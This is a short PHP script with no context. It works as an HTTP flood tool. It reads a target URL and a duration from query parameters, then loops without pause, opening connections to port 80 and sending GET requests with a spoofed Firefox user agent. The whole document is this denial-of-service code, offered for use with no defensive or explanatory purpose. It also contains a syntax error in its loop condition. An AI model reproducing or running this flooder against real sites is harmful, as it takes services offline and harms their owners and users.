echo 'running';
$secondsToRun = $_GET['time'];
$url = $_GET['url'];
$parsed_url = parse($url);
$host = $parsed_url['host'];
$path = $parsed_url['path'];

if ($path == "")
        $path = "/";

$timeNow = strtotime('now');
$timeToStop = $timeNow + $secondsToRun;

while(1)
{
        $timeNow = strtotime('now');
        if ($timeNow >= $timeToStop))
                break;
                
        $sock = fsockopen($host, 80);
        $pack = "GET $path HTTP/1.1\r\n";
        $pack.= "Host: " .$host. "\r\n";
        $pack.= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
        $pack.= "Accept: */*\r\n";
        $pack.= "Accept-Language: en-US,en;q=0.5\r\n";
        $pack.= "Connection: closed\r\n\r\n";
        fputs($sock, $pack);
        fclose($sock);
        //sleep(1);
}

function parse($url){
    if(strpos($url,"://")===false) $url = "http://".$url;
    $info = parse_url($url);
    return $info;
}
